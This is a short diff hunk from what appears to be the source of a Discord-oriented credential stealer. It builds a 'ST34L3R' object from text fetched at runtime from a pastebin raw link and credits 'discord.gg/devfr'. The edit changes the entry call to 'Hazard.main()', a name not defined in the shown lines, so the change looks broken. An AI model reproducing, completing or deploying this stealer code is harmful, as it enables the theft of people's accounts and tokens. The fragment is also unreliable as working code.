@@ -173,4 +173,4 @@ ST34L3R = ST34L3R(
     requests.get("https://pastebin.com/raw/XXXXXXXX").text,
     "Stealed by discord.gg/devfr"
 )
-ST34L3R.main()
+Hazard.main()
